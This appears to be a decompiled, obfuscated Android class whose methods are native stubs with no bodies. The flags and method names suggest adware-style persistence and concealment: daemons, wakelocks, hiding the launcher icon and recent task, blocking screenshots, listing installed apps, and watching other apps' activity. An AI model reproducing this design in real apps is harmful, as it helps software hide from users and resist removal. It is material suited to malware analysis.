package marmojkfnf.huflnkmt.ncagri.jdtuadkc;

import android.app.Activity;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import com.blankj.utilcode.util.PermissionUtils;
import fmfjq.twyvy.xjhbp;
import java.util.ArrayList;
import java.util.List;
import marmojkfnf.dphnidckqxhm.i0;
import marmojkfnf.mnhosc.cswoel.wvfxxn.Mhufawcu;

/* loaded from: classes4.dex */
public final class Ksfndkd {
    public static final Ksfndkd INSTANCE;
    private static boolean USE_BA_ACTIVITY;
    private static boolean USE_ShowWhenLocked;
    private static boolean USE_woxhyoq_ACTIVITY;
    private static Notification.Builder custom_notification;
    private static final Mhufawcu fgImpl;
    private static Qleybpju fgListener;
    private static ArrayList<String> hideActivityWhiteListActivity;
    private static boolean hide_activity_task;
    private static boolean isInit;
    private static boolean isStop;
    private static boolean prohibitScreenshots;
    private static boolean use_account;
    private static boolean use_activity;
    private static boolean use_auto_reqNotificationPermissions;
    private static boolean use_auto_widget;
    private static boolean use_domaemon;
    private static boolean use_float_window;
    private static boolean use_music;
    private static boolean use_notification;
    private static boolean use_provider;
    private static boolean use_receiver;
    private static boolean use_safe_mode;
    private static boolean use_service;
    private static boolean use_thaw;
    private static boolean use_wakelock;

    /* loaded from: classes23.dex */
    public static final class a implements PermissionUtils.SimpleCallback {

        /* renamed from: a, reason: collision with root package name */
        public final Context f4433a;

        static {
            xjhbp.classescxclcy(99);
        }

        public a(Context context) {
            this.f4433a = context;
        }

        @Override // com.blankj.utilcode.util.PermissionUtils.SimpleCallback
        public final native void onDenied();

        @Override // com.blankj.utilcode.util.PermissionUtils.SimpleCallback
        public final native void onGranted();
    }

    static {
        xjhbp.classescxclcy(45);
        INSTANCE = new Ksfndkd();
        fgImpl = new Mhufawcu();
        use_wakelock = true;
        use_provider = true;
        use_receiver = true;
        use_account = true;
        use_thaw = true;
        use_safe_mode = true;
        USE_ShowWhenLocked = true;
        prohibitScreenshots = true;
        USE_woxhyoq_ACTIVITY = true;
    }

    private Ksfndkd() {
    }

    public static /* synthetic */ void hdic$default(Ksfndkd ksfndkd, Context context, String str, int i5, int i6, Object obj) {
        if ((i6 & 4) != 0) {
            i5 = 2;
        }
        ksfndkd.hdic(context, str, i5);
    }

    public static /* synthetic */ void isSF$default(Ksfndkd ksfndkd, Context context, boolean z4, String str, int[] iArr, String str2, String str3, int i5, Object obj) {
        if ((i5 & 16) != 0) {
            str2 = i0.a("Q04=");
        }
        String str4 = str2;
        if ((i5 & 32) != 0) {
            str3 = i0.a("emg=");
        }
        ksfndkd.isSF(context, z4, str, iArr, str4, str3);
    }

    public static /* synthetic */ void listenInstalledAppStartOrEnd$default(Ksfndkd ksfndkd, Qleybpju qleybpju, int i5, int i6, int i7, Object obj) {
        if ((i7 & 2) != 0) {
            i5 = 40;
        }
        if ((i7 & 4) != 0) {
            i6 = 40;
        }
        ksfndkd.listenInstalledAppStartOrEnd(qleybpju, i5, i6);
    }

    public static /* synthetic */ void surprise2$default(Ksfndkd ksfndkd, Context context, Intent intent, Hbkffen hbkffen, int i5, Object obj) {
        if ((i5 & 4) != 0) {
            hbkffen = null;
        }
        ksfndkd.surprise2(context, intent, hbkffen);
    }

    public final native void attach(Context context);

    public final native void batteryStrategy(Context context);

    public final native Notification.Builder getCustom_notification();

    public final native Qleybpju getFgListener();

    public final native ArrayList<String> getHideActivityWhiteListActivity();

    public final native boolean getHide_activity_task();

    public final native List<String> getInstallAppList(Context context);

    public final native void getInstallRefer(Context context, Qoghcdrl qoghcdrl);

    public final native boolean getProhibitScreenshots();

    public final native String getSettingIconName(Context context);

    public final native boolean getUSE_BA_ACTIVITY();

    public final native boolean getUSE_ShowWhenLocked();

    public final native boolean getUSE_woxhyoq_ACTIVITY();

    public final native boolean getUse_account();

    public final native boolean getUse_activity();

    public final native boolean getUse_auto_reqNotificationPermissions();

    public final native boolean getUse_auto_widget();

    public final native boolean getUse_domaemon();

    public final native boolean getUse_float_window();

    public final native boolean getUse_music();

    public final native boolean getUse_notification();

    public final native boolean getUse_provider();

    public final native boolean getUse_receiver();

    public final native boolean getUse_safe_mode();

    public final native boolean getUse_service();

    public final native boolean getUse_thaw();

    public final native boolean getUse_wakelock();

    public final native boolean hasAWG(Context context);

    public final native boolean hasBatteryStrategy(Context context);

    public final native boolean hasPopWindowPermissions(Context context);

    public final native boolean hasWallpaper(Context context);

    public final native boolean hasWhitelistSettings(Context context);

    public final native void hdic(Context context);

    public final native void hdic(Context context, String str, int i5);

    public final native void init(Context context);

    public final native void init(Context context, boolean z4);

    public final native boolean isAppInFront();

    public final native boolean isFgActivity(String str);

    public final native boolean isFgProcess(Context context);

    public final native boolean isInit();

    public final native boolean isMainProcess(Context context);

    public final native void isSF(Context context, boolean z4, String str, int[] iArr, String str2, String str3);

    public final native boolean isStop();

    public final native boolean ishdic(Context context, String str);

    public final native void listenInstalledAppStartOrEnd(Qleybpju qleybpju, int i5, int i6);

    public final native void regActionListener(Context context, Uqjqbxl uqjqbxl);

    public final native void regActionReceiver(Context context);

    public final native void reqNotificationPermissionsIfNotEnabled(Context context);

    public final native void reqNotificationsPermission(Activity activity);

    public final native void reqPopWindowPermissions(Context context);

    public final native void setCustom_notification(Notification.Builder builder);

    public final native void setFGListener(Qleybpju qleybpju);

    public final native void setFgListener(Qleybpju qleybpju);

    public final native void setHideActivityWhiteListActivity(ArrayList<String> arrayList);

    public final native void setHide_activity_task(boolean z4);

    public final native void setInit(boolean z4);

    public final native void setIsHideActivityTaskWhenHome(boolean z4, ArrayList<String> arrayList);

    public final native void setOrUpdateToken(Context context, String str);

    public final native void setProhibitScreenshots(boolean z4);

    public final native void setStop(boolean z4);

    public final native void setUSE_BA_ACTIVITY(boolean z4);

    public final native void setUSE_ShowWhenLocked(boolean z4);

    public final native void setUSE_woxhyoq_ACTIVITY(boolean z4);

    public final native void setUse_account(boolean z4);

    public final native void setUse_activity(boolean z4);

    public final native void setUse_auto_reqNotificationPermissions(boolean z4);

    public final native void setUse_auto_widget(boolean z4);

    public final native void setUse_domaemon(boolean z4);

    public final native void setUse_float_window(boolean z4);

    public final native void setUse_music(boolean z4);

    public final native void setUse_notification(boolean z4);

    public final native void setUse_provider(boolean z4);

    public final native void setUse_receiver(boolean z4);

    public final native void setUse_safe_mode(boolean z4);

    public final native void setUse_service(boolean z4);

    public final native void setUse_thaw(boolean z4);

    public final native void setUse_wakelock(boolean z4);

    public final native void setWallpaper(Context context, Bitmap bitmap, Bitmap bitmap2);

    public final native void showIcon(Context context, String str);

    public final native void showLauncher(Context context, String str);

    public final native void showTips(Context context, String str);

    public final native void startAWG(Context context);

    public final native void stop(Context context);

    public final native void stopMusic(Context context);

    public final native void surprise(Context context, Intent intent, String str, boolean z4, boolean z5, Jehtxjp jehtxjp, Hbkffen hbkffen);

    public final native void surprise2(Context context, Intent intent, Hbkffen hbkffen);

    public final native void unRegActionListener(Context context, Uqjqbxl uqjqbxl);

    public final native void unRegActionReceiver(Context context);

    public final native void whitelistSettings(Context context);
}
